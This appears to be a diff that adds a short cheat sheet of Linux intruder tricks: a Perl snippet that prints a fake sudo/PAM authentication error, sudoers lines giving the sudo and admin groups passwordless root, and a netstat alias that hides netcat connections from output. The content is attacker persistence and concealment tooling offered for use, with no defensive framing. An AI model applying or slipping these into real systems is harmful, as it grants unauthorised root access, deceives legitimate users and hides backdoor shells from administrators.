@@ -1,0 +1,20 @@
+        Fake Error Message:
+
+use Term::ANSIColor;
+print color('red');
+print "error authenticating sudo. Are you using the correct version of PAM?";
+print color('reset');
+print "\n";
+
+
+
+        Sudo No Password:
+
+%sudo ALL=(ALL:ALL) NOPASSWD:ALL
+%admin ALL=(ALL) NOPASSWD:ALL
+
+
+
+        Netstat Alias:
+        
+alias netstat='netstat -tulpn | grep -v nc && exit'
